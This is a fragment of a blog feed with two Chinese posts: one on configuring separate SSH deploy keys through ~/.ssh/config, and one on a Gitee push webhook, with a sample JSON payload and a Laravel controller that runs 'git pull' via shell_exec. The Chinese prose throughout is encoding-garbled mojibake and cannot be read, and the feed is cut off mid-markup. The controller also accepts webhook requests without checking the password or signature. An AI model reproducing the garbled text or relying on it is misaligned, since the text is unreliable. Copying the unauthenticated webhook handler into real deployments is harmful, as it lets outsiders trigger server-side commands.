        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/007S8ZIlly1gg1ad6ihx3j30e80a6wes.jpg" alt=""></p><a id="more"></a><p>å½“æˆ‘ä»¬æœåŠ¡å™¨éœ€è¦å¯¹æ‰˜ç®¡äº GitHub çš„é¡¹ç›®è¿›è¡Œè®¿é—®æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨é¡¹ç›®è®¾ç½®ä¸­çš„ Deploy keys æ·»åŠ æœåŠ¡å™¨çš„å…¬é’¥ï¼Œå½“æˆ‘ä»¬çš„æœåŠ¡å™¨åŒæ—¶éœ€è¦å¯¹å¦ä¸€ä¸ªæ‰˜ç®¡äº GitHub é¡¹ç›®è®¿é—®æ—¶ï¼Œæ·»åŠ ç›¸åŒçš„ Deploy keys å°±ä¼šæç¤º<code>Key already in use</code>ï¼Œè¿™æ˜¯ç”±äºï¼Œä¸€ä¸ªé¡¹ç›®å¯ä»¥ç”±å¤šä¸ªä¸åŒçš„å…¬é’¥ï¼Œä½†åŒä¸€ä¸ªå…¬é’¥ä¸å…è®¸ä½¿ç”¨åœ¨å¤šä¸ªä¸åŒçš„é¡¹ç›®ä¸­ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•é€šè¿‡ ssh è®¿é—®ç¬¬äºŒä¸ªä»“åº“å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯æˆ‘ä»¬ä½¿ç”¨ä¸åŒçš„å¯†é’¥å¯¹ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬æ–°ç”Ÿæˆä¸€å¯¹åä¸º demo çš„å¯†é’¥</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/home/robin/.ssh/id_rsa): /home/robin/.ssh/demo</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in demo.</span><br><span class="line">Your public key has been saved in demo.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:sIouChdx8Qh1M4a6JCyNoDU7/cDKg9Sx23dX8HTksVw robin<span class="meta">@ubuntu</span></span><br><span class="line">The key's randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|<span class="string">  ..*..          </span>|</span><br><span class="line">|<span class="string">. oo B.        .E</span>|</span><br><span class="line">|<span class="string">o=.=o.o       .o+</span>|</span><br><span class="line">|<span class="string">+ *oB  o    . .oo</span>|</span><br><span class="line">|<span class="string"> o.* *. S    + . </span>|</span><br><span class="line">|<span class="string">  =o+..       o  </span>|</span><br><span class="line">|<span class="string">.oo..o       .   </span>|</span><br><span class="line">|<span class="string">oo. . . . . .    </span>|</span><br><span class="line">|<span class="string">o..    . . .     </span>|</span><br><span class="line">+----[SHA256]-----+</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬çš„ç›®æ ‡ç›®å½•ä¸‹å°±ä¼šæ–°å¢ demo å’Œ demo.pub ä¸¤ä¸ªå¯†é’¥ï¼Œç„¶åå†åˆ›å»ºä¸€ä¸ª<code>vim /home/robin/.ssh/config</code>æ–‡ä»¶ï¼Œå…¶ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host demo</span><br><span class="line">HostName github.com</span><br><span class="line">User robin</span><br><span class="line">IdentityFile ~/.ssh/demo</span><br></pre></td></tr></table></figure><p><code>chmod 600 /home/robin/.ssh/config</code>ä¿®æ”¹configæ–‡ä»¶æƒé™ï¼Œå¦åˆ™ä¼šå‡ºç°<code>Bad owner or permissions on /home/robin/.ssh/config</code>çš„é”™è¯¯</p><p>ç°åœ¨ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹ä¸‹é¡¹ç›®çš„è¯·æ±‚åœ°å€ï¼Œåœ¨é¡¹ç›®ç›®å½•ä¸­æ‰§è¡Œ<code>vim .git/config</code>ï¼Œä¿®æ”¹å…¶ä¸­çš„ url å‚æ•°ï¼Œå°†å…¶ä¸­çš„ github.com æ›¿æ¢ä¸º demoï¼Œå¦‚å°† <code>git@github.com:ms/demo.git</code> ä¿®æ”¹ä¸º<code>git@demo:ms/demo.git</code>ã€‚</p><p>Now, enjoy it!</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨ webhook è‡ªåŠ¨æ›´æ–°ä»£ç </title>
      <link href="/post/auto-update-code-by-webhook/"/>
      <url>/post/auto-update-code-by-webhook/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/007S8ZIlly1gflvuh30wgj30jg0azdga.jpg" alt=""></p><a id="more"></a><p>æœ€è¿‘åœ¨éƒ¨ç½²ä»£ç æ—¶ï¼Œæ¯æ¬¡æ¨é€åéƒ½éœ€è¦å†ç™»é™†æœºå™¨æ‰‹åŠ¨æ‰§è¡Œ<code>git pull</code>æ›´æ–°ä»£ç ï¼Œä¸€ä¸¤æ¬¡è¿˜è¡Œï¼Œå½“é‡å¤å¤šäº†ä¹‹åï¼Œå°±è§‰å¾—å®åœ¨æ˜¯å¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥å°±ç ”ç©¶äº†ä¸€ä¸‹ webhook åŠŸèƒ½ï¼Œæˆ‘ä»¬ä»¥ Gitee ä¸ºä¾‹ç®€è¦è¯´æ˜ä¸€ä¸‹å…¶åŸç†ã€‚</p><p>webhook å°±æ˜¯åœ¨ä»“åº“æ¥æ”¶åˆ°ä¸€æ¬¡äº‹ä»¶ï¼ˆå¦‚ pushã€pull ç­‰ï¼‰åï¼Œå‘æŒ‡å®š URL å‘é€ä¸€æ¬¡è¯·æ±‚ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸»æœºä¸Šéƒ¨ç½²è„šæœ¬æ¥å¤„ç†æ”¶åˆ°è¿™æ ·çš„æ—¶é—´é€šçŸ¥çš„åŠ¨ä½œã€‚</p><p>ä»¥ä¸‹æ˜¯ Gitee çš„ PUSH äº‹ä»¶æ¨é€çš„æ•°æ®æ ¼å¼</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"hook_name"</span>: <span class="string">"push_hooks"</span>, </span><br><span class="line">  <span class="attr">"password"</span>: <span class="string">"pwd"</span>,</span><br><span class="line">  <span class="attr">"hook_id"</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"hook_url"</span>: <span class="string">"http://gitee.com/liwen/gitos/hooks/1/edit"</span>,</span><br><span class="line">  <span class="attr">"timestamp"</span>: <span class="string">"1576754827988"</span>,</span><br><span class="line">  <span class="attr">"sign"</span>: <span class="string">"rLEHLuZRIQHuTPeXMib9Czoq9dVXO4TsQcmQQHtjXHA="</span>,</span><br><span class="line">  <span class="attr">"ref"</span>: <span class="string">"refs/heads/change_commitlint_config"</span>,</span><br><span class="line">  <span class="attr">"before"</span>: <span class="string">"0000000000000000000000000000000000000000"</span>,</span><br><span class="line">  <span class="attr">"after"</span>: <span class="string">"1cdcd819599cbb4099289dbbec762452f006cb40"</span>,</span><br><span class="line">  <span class="attr">"created"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"deleted"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"compare"</span>: <span class="string">"https://gitee.com/oschina/gitee/compare/0000000000000000000000000000000000000000...1cdcd819599cbb4099289dbbec762452f006cb40"</span>,</span><br><span class="line">  <span class="attr">"commits"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"1cdcd819599cbb4099289dbbec762452f006cb40"</span>,</span><br><span class="line">      <span class="attr">"tree_id"</span>: <span class="string">"db78f3594ec0683f5d857ef731df0d860f14f2b2"</span>,</span><br><span class="line">      <span class="attr">"distinct"</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">"message"</span>: <span class="string">"Update README.md"</span>,</span><br><span class="line">      <span class="attr">"timestamp"</span>: <span class="string">"2018-02-05T23:46:46+08:00"</span>,</span><br><span class="line">      <span class="attr">"url"</span>: <span class="string">"https://gitee.com/oschina/gitee/commit/1cdcd819599cbb4099289dbbec762452f006cb40"</span>,</span><br><span class="line">      <span class="attr">"author"</span>: &#123;</span><br><span class="line">        <span class="attr">"time"</span>: <span class="string">"2018-02-05T23:46:46+08:00"</span>,</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">        <span class="attr">"email"</span>: <span class="string">"robot@gitee.com"</span>,</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"robot"</span>,</span><br><span class="line">        <span class="attr">"user_name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"https://gitee.com/robot"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"committer"</span>: &#123;</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">        <span class="attr">"email"</span>: <span class="string">"robot@gitee.com"</span>,</span><br><span class="line">        <span class="attr">"username"</span>: <span class="string">"robot"</span>,</span><br><span class="line">        <span class="attr">"user_name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"https://gitee.com/robot"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"added"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"removed"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"modified"</span>: [</span><br><span class="line">        <span class="string">"README.md"</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"head_commit"</span>: &#123;</span><br><span class="line">    <span class="attr">"id"</span>: <span class="string">"1cdcd819599cbb4099289dbbec762452f006cb40"</span>,</span><br><span class="line">    <span class="attr">"tree_id"</span>: <span class="string">"db78f3594ec0683f5d857ef731df0d860f14f2b2"</span>,</span><br><span class="line">    <span class="attr">"distinct"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">"Update README.md"</span>,</span><br><span class="line">    <span class="attr">"timestamp"</span>: <span class="string">"2018-02-05T23:46:46+08:00"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: <span class="string">"https://gitee.com/oschina/gitee/commit/1cdcd819599cbb4099289dbbec762452f006cb40"</span>,</span><br><span class="line">    <span class="attr">"author"</span>: &#123;</span><br><span class="line">      <span class="attr">"time"</span>: <span class="string">"2018-02-05T23:46:46+08:00"</span>,</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">      <span class="attr">"email"</span>: <span class="string">"robot@gitee.com"</span>,</span><br><span class="line">      <span class="attr">"username"</span>: <span class="string">"robot"</span>,</span><br><span class="line">      <span class="attr">"user_name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">      <span class="attr">"url"</span>: <span class="string">"https://gitee.com/robot"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"committer"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">      <span class="attr">"email"</span>: <span class="string">"robot@gitee.com"</span>,</span><br><span class="line">      <span class="attr">"username"</span>: <span class="string">"robot"</span>,</span><br><span class="line">      <span class="attr">"user_name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">      <span class="attr">"url"</span>: <span class="string">"https://gitee.com/robot"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"added"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"removed"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"modified"</span>: [</span><br><span class="line">      <span class="string">"README.md"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"total_commits_count"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"commits_more_than_ten"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"repository"</span>: &#123;</span><br><span class="line">    <span class="attr">"id"</span>: <span class="number">120249025</span>,</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"Gitee"</span>,</span><br><span class="line">    <span class="attr">"path"</span>: <span class="string">"gitee"</span>,</span><br><span class="line">    <span class="attr">"full_name"</span>: <span class="string">"å¼€æºä¸­å›½/Gitee"</span>,</span><br><span class="line">    <span class="attr">"owner"</span>: &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">"login"</span>: <span class="string">"robot"</span>,</span><br><span class="line">      <span class="attr">"avatar_url"</span>: <span class="string">"https://gitee.com/assets/favicon.ico"</span>,</span><br><span class="line">      <span class="attr">"html_url"</span>: <span class="string">"https://gitee.com/robot"</span>,</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"User"</span>,</span><br><span class="line">      <span class="attr">"site_admin"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">      <span class="attr">"email"</span>: <span class="string">"robot@gitee.com"</span>,</span><br><span class="line">      <span class="attr">"username"</span>: <span class="string">"robot"</span>,</span><br><span class="line">      <span class="attr">"user_name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">      <span class="attr">"url"</span>: <span class="string">"https://gitee.com/robot"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"private"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"html_url"</span>: <span class="string">"https://gitee.com/oschina/gitee"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: <span class="string">"https://gitee.com/oschina/gitee"</span>,</span><br><span class="line">    <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"fork"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"created_at"</span>: <span class="string">"2018-02-05T23:46:46+08:00"</span>,</span><br><span class="line">    <span class="attr">"updated_at"</span>: <span class="string">"2018-02-05T23:46:46+08:00"</span>,</span><br><span class="line">    <span class="attr">"pushed_at"</span>: <span class="string">"2018-02-05T23:46:46+08:00"</span>,</span><br><span class="line">    <span class="attr">"git_url"</span>: <span class="string">"git://gitee.com:oschina/gitee.git"</span>,</span><br><span class="line">    <span class="attr">"ssh_url"</span>: <span class="string">"git@gitee.com:oschina/gitee.git"</span>,</span><br><span class="line">    <span class="attr">"clone_url"</span>: <span class="string">"https://gitee.com/oschina/gitee.git"</span>,</span><br><span class="line">    <span class="attr">"svn_url"</span>: <span class="string">"svn://gitee.com/oschina/gitee"</span>,</span><br><span class="line">    <span class="attr">"git_http_url"</span>: <span class="string">"https://gitee.com/oschina/gitee.git"</span>,</span><br><span class="line">    <span class="attr">"git_ssh_url"</span>: <span class="string">"git@gitee.com:oschina/gitee.git"</span>,</span><br><span class="line">    <span class="attr">"git_svn_url"</span>: <span class="string">"svn://gitee.com/oschina/gitee"</span>,</span><br><span class="line">    <span class="attr">"homepage"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"stargazers_count"</span>: <span class="number">11</span>,</span><br><span class="line">    <span class="attr">"watchers_count"</span>: <span class="number">12</span>,</span><br><span class="line">    <span class="attr">"forks_count"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"language"</span>: <span class="string">"ruby"</span>,</span><br><span class="line">    <span class="attr">"has_issues"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"has_wiki"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"has_pages"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"license"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"open_issues_count"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"default_branch"</span>: <span class="string">"master"</span>,</span><br><span class="line">    <span class="attr">"namespace"</span>: <span class="string">"oschina"</span>,</span><br><span class="line">    <span class="attr">"name_with_namespace"</span>: <span class="string">"å¼€æºä¸­å›½/Gitee"</span>,</span><br><span class="line">    <span class="attr">"path_with_namespace"</span>: <span class="string">"oschina/gitee"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"sender"</span>: &#123;</span><br><span class="line">    <span class="attr">"id"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"login"</span>: <span class="string">"robot"</span>,</span><br><span class="line">    <span class="attr">"avatar_url"</span>: <span class="string">"https://gitee.com/assets/favicon.ico"</span>,</span><br><span class="line">    <span class="attr">"html_url"</span>: <span class="string">"https://gitee.com/robot"</span>,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"User"</span>,</span><br><span class="line">    <span class="attr">"site_admin"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">    <span class="attr">"email"</span>: <span class="string">"robot@gitee.com"</span>,</span><br><span class="line">    <span class="attr">"username"</span>: <span class="string">"robot"</span>,</span><br><span class="line">    <span class="attr">"user_name"</span>: <span class="string">"robot"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: <span class="string">"https://gitee.com/robot"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"enterprise"</span>: &#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"å¼€æºä¸­å›½"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: <span class="string">"https://gitee.com/oschina"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»¥ Laravel ä»£ç ä¸ºä¾‹æ¥å¤„ç†è¿™ä¸ªè¯·æ±‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Log</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GitHookController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> TEST = [</span><br><span class="line">        <span class="string">'DIR'</span>    =&gt; <span class="string">'/home/wwwroot/demo/'</span>,</span><br><span class="line">        <span class="string">'BRANCH'</span> =&gt; <span class="string">'test'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> PROD = [</span><br><span class="line">        <span class="string">'DIR'</span>    =&gt; <span class="string">'/home/wwwroot/demo/'</span>,</span><br><span class="line">        <span class="string">'BRANCH'</span> =&gt; <span class="string">'master'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Request $request</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;input(<span class="string">'total_commits_count'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            $log = [</span><br><span class="line">                <span class="string">'commits_count'</span> =&gt; $request-&gt;input(<span class="string">'total_commits_count'</span>),</span><br><span class="line">                <span class="string">'commits'</span>       =&gt; array_column($request-&gt;input(<span class="string">'commits'</span>), <span class="string">'id'</span>)</span><br><span class="line">            ];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'refs/heads/master'</span> === $request-&gt;input(<span class="string">'ref'</span>) &amp;&amp; <span class="string">'production'</span> === getenv(<span class="string">'APP_ENV'</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pullCode(<span class="keyword">self</span>::PROD[<span class="string">'DIR'</span>], <span class="keyword">self</span>::PROD[<span class="string">'BRANCH'</span>], $log);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="string">'refs/heads/test'</span> === $request-&gt;input(<span class="string">'ref'</span>) &amp;&amp; <span class="string">'test'</span> === getenv(<span class="string">'APP_ENV'</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pullCode(<span class="keyword">self</span>::TEST[<span class="string">'DIR'</span>], <span class="keyword">self</span>::TEST[<span class="string">'BRANCH'</span>], $log);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'Nothing to update'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $dir ä»£ç æ ¹è·¯å¾„</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $branch åˆ†æ”¯åç§°</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $log æ—¥å¿—å†…å®¹</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">pullCode</span><span class="params">($dir, $branch, $log)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Log::channel(<span class="string">'pullcode'</span>)-&gt;info(<span class="string">'-------PULL START-------'</span>);</span><br><span class="line"></span><br><span class="line">        $result = shell_exec(<span class="string">"cd &#123;$dir&#125; &amp;&amp; git checkout . &amp;&amp; git checkout &#123;$branch&#125; &amp;&amp; git pull 2&gt;&amp;1"</span>);</span><br><span class="line"></span><br><span class="line">        Log::channel(<span class="string">'pullcode'</span>)-&gt;info(json_encode($log));</span><br><span class="line">        Log::channel(<span class="string">'pullcode'</span>)-&gt;info($result);</span><br><span class="line">        Log::channel(<span class="string">'pullcode'</span>)-&gt;info(<span class="string">'-------PULL END-------'</span> . PHP_EOL);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†ä¸€ä¸ªéš¾ç‚¹ï¼Œæˆ‘ç™»é™†çš„ç”¨æˆ·æ˜¯ adminï¼Œä½†è„šæœ¬æ‰§è¡Œç”¨æˆ·æ˜¯éç™»å½•ç”¨æˆ· wwwï¼Œadmin å¯ä»¥æ‹‰å–ä»£ç ï¼Œä½†æˆ‘éœ€è¦ç”¨ www æ¥æ‰§è¡Œè„šæœ¬ï¼Œè¿™æ ·å°±å¯¼è‡´äº† www æ²¡æœ‰æƒé™æ‹‰å–ä»£ç ï¼Œåœ¨ç”¨ www ç”¨æˆ·æ‰§è¡Œ<code>shell_exec(&quot;git pull&quot;)</code>ç­‰å‘½ä»¤æ—¶æ²¡æœ‰ä»»ä½•çš„è¾“å‡ºï¼Œç»è¿‡ä¸€ç•ªæŸ¥è¯¢åï¼ŒåŠ ä¸Š<code>2&gt;&amp;1</code>æ‰å°†è¾“å‡ºæ‰“å°ï¼Œç„¶åæ ¹æ®é”™è¯¯æç¤ºï¼Œè®¾ç½® sshã€æ–‡ä»¶æƒé™ï¼Œæœ€åç»ˆäºæˆåŠŸäº†ã€‚</p><p>åœ¨è®¾ç½® ssh æ—¶ï¼Œå¯ä»¥ä¸º www ç”¨æˆ·ç”Ÿæˆä¸€å¥—å¯†é’¥å¯¹ï¼Œä¹Ÿå¯ä»¥å°† admin çš„ ssh å¤åˆ¶åˆ° www çš„ .ssh ä¸­ï¼›åœ¨æ–‡ä»¶æƒé™è¿™é‡Œï¼Œå¯ä»¥å°† www ç”¨æˆ·åŠ å…¥ admin ç”¨æˆ·ç»„ï¼Œç„¶åå¯¹ä»£ç ä¸­çš„æ‰€æœ‰æ–‡ä»¶éƒ½æ·»åŠ æ‰€å±ç»„çš„å†™å…¥æƒé™æ¥è§£å†³<code>sudo chmod -R g+w code</code></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://blog.csdn.net/qq_31238721/article/details/81670578" target="_blank" 